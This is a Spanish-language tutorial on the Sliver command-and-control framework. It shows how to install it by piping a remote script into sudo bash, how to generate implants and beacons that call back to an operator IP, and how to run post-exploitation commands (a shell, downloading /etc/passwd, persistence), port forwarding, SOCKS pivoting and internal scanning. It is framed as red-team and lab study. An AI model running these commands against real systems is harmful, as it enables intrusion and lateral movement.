> **Sliver** es un **framework C2 moderno**, usado en **Red Team real**, diseñado para **controlar múltiples implantes**, automatizar operaciones y realizar **post-explotación avanzada** de forma limpia, modular y profesional.

> Mentalidad correcta: **Sliver no es un exploit, es el centro de mando.**

---

## 📌 **Índice**

- [[#🎯 Qué es Sliver y para qué se usa]]
- [[#🧱 Arquitectura mental de Sliver]]
- [[#⚙️ Instalación correcta]]
- [[#🚀 Arranque y conceptos básicos]]
- [[#🧬 Implants vs Beacons]]
- [[#🛠️ Generación de payloads]]
- [[#📡 Listeners y transporte]]
- [[#🔗 Gestión de sesiones]]
- [[#💻 Post-explotación básica]]
- [[#🔥 Post-explotación avanzada]]
- [[#🤖 Automatización y workflows]]
- [[#🕶️ Beacons y stealth]]
- [[#🔐 Seguridad y OPSEC]]
- [[#🧠 Comparativa Sliver vs Metasploit]]
- [[#📚 Cheatsheet rápida]]
- [[#⚠️ Consideraciones legales]]

---

## 🎯 **Qué es Sliver y para qué se usa**

Sliver es un **Command & Control (C2)** que permite:

- Controlar implantes en sistemas comprometidos
    
- Ejecutar comandos remotamente
    
- Subir / bajar archivos
    
- Automatizar tareas
    
- Coordinar múltiples targets
    

Usos reales:

- Red Team
    
- Laboratorios ofensivos
    
- Investigación de post-explotación
    
- Simulación de amenazas avanzadas
    

---

## 🧱 **Arquitectura mental de Sliver**

```
[Operador]
   │
   ▼
[Sliver Server / Console]
   │
   ├── Listeners (HTTP / HTTPS / mTLS / DNS)
   │
   ▼
[Implants / Beacons]
   │
   ▼
[Targets]
```

- **Server**: tu centro de mando
    
- **Implant**: binario que corre en el target
    
- **Session**: conexión activa
    
- **Beacon**: conexión intermitente (stealth)
    

---

## ⚙️ **Instalación correcta**

### Kali / Linux

```bash
curl https://sliver.sh/install | sudo bash
```

Verificar:

```bash
sliver version
```

---

## 🚀 **Arranque y conceptos básicos**

Iniciar Sliver:

```bash
sliver
```

Prompt:

```
sliver >
```

Comandos básicos:

```bash
help
version
settings
```

---

## 🧬 **Implants vs Beacons**

### 🔴 Implant (Session)

- Conexión directa
    
- Respuesta inmediata
    
- Ideal para labs
    

### 🟡 Beacon

- Conexión cada X tiempo
    
- Más sigiloso
    
- Más realista
    

---

## 🛠️ **Generación de payloads (Implants)**

Ejemplo Linux ELF vía HTTP:

```bash
generate --os linux --arch amd64 --format elf --http 192.168.1.74:80
```

Opciones importantes:

- `--os` : linux / windows / darwin
    
- `--arch` : amd64 / 386 / arm
    
- `--format` : elf / exe / dll / service
    
- `--http` : listener
    

El payload se guarda localmente.

---

## 📡 **Listeners y transporte**

Ver listeners:

```bash
listeners
```

Crear HTTP listener:

```bash
http
```

Transportes soportados:

- HTTP / HTTPS
    
- mTLS
    
- DNS
    
- WireGuard
    

---

## 🔗 **Gestión de sesiones**

Ver sesiones:

```bash
sessions
```

Entrar en sesión:

```bash
use 1
```

Salir:

```bash
background
```

---

## 💻 **Post-explotación básica**

Ejecutar comandos:

```bash
execute whoami
execute id
execute uname -a
```

Shell interactiva:

```bash
shell
```

Transferencia de archivos:

```bash
upload local.txt /tmp/file.txt
download /etc/passwd
```

Info del sistema:

```bash
info
```

---

## 🔥 **Post-explotación avanzada**

Enumeración:

```bash
execute ps aux
execute netstat -tunlp
```

Persistencia (depende OS):

- systemd
    
- services
    
- registry (Windows)
    

Pivoting:

- Túneles
    
- Reutilización de sesiones
    

---

## 🤖 **Automatización y workflows**

Sliver permite:

- Controlar múltiples sesiones
    
- Ejecutar comandos en cadena
    

Ejemplo mental:

```bash
sessions
use 1
execute hostname
use 2
execute hostname
```

Ideal para operaciones coordinadas.

---

## 🕶️ **Beacons y stealth**

Generar beacon:

```bash
generate --os linux --arch amd64 --format elf --http 192.168.1.74:80 --beacon 30s
```

Ver beacons:

```bash
beacons
```

Entrar:

```bash
use beacon 1
```

Ventajas:

- Menos ruido
    
- Más realismo
    

---

## 🔐 **Seguridad y OPSEC**

Sliver incluye:

- TLS / mTLS
    
- Certificados
    
- Profiles
    
- Evasión básica
    

Buenas prácticas:

- Usar HTTPS
    
- Rotar payloads
    
- No reutilizar listeners
    

---

## 🧠 **Comparativa Sliver vs Metasploit**

|Sliver|Metasploit|
|---|---|
|Moderno|Legacy|
|Go|Ruby|
|C2 puro|Exploit + C2|
|Ligero|Pesado|
|Red Team|Mixto|

---

## 📚 **Cheatsheet rápida**

```bash
sliver
sessions
use 1
execute whoami
shell
upload
beacons
generate
listeners
```

---

## ⚠️ **Consideraciones legales**

Sliver debe usarse **solo** en:

- Laboratorios
    
- Máquinas propias
    
- Entornos autorizados
    

Uso ilegal = delito.

---

## 🎯 **Conclusión PRO**

Sliver es:

- Lo que UFONET quiso ser
    
- Un C2 moderno
    
- Una herramienta de nivel profesional
    

Dominar Sliver = **subir de nivel real**.

---

# 🧠 4️⃣ Identificar si puedes pivotar

Busca esto:

`execute ip route`

Ejemplo salida:

`10.10.20.0/24 dev eth1`

💥 BOOM  
Eso significa:

- El target ve otra red
    
- Tú no
    
- **Pivot posible**
    

---

# 🔀 5️⃣ Pivoting con Sliver (forma REAL)

## 🔹 Opción A: Port Forwarding (la más común)

Ejemplo:

- Base de datos interna: `10.10.20.10:3306`
    
- Solo accesible desde el target
    

### Crear port forward:

`portfwd add --remote 10.10.20.10:3306 --local 127.0.0.1:3306`

Ahora, **desde tu máquina**:

`mysql -h 127.0.0.1 -P 3306`

👉 Parece local  
👉 En realidad pasa por el target

Esto es **pivoting real**.

---

## 🔹 Ver port forwards activos

`portfwd list`

Eliminar:

`portfwd rm 1`

---

# 🌐 6️⃣ Pivoting para escanear red interna

### Idea:

Usas el target como **scanner interno**.

Ejemplo:

`execute nmap -sT 10.10.20.0/24`

👉 El escaneo ocurre **desde dentro**  
👉 Firewalls externos no lo ven

---

# 🔥 7️⃣ Pivoting AVANZADO (túnel completo)

Sliver permite **SOCKS proxy**.

### Crear SOCKS proxy:

`socks5`

Esto abre algo como:

`127.0.0.1:1080`

Ahora configuras:

- Burp
    
- Proxychains
    
- Firefox
    

Para que **todo el tráfico pase por el target**.

Ejemplo:

`proxychains nmap -sT 10.10.20.0/24`

👉 Esto ya es **Red Team serio**.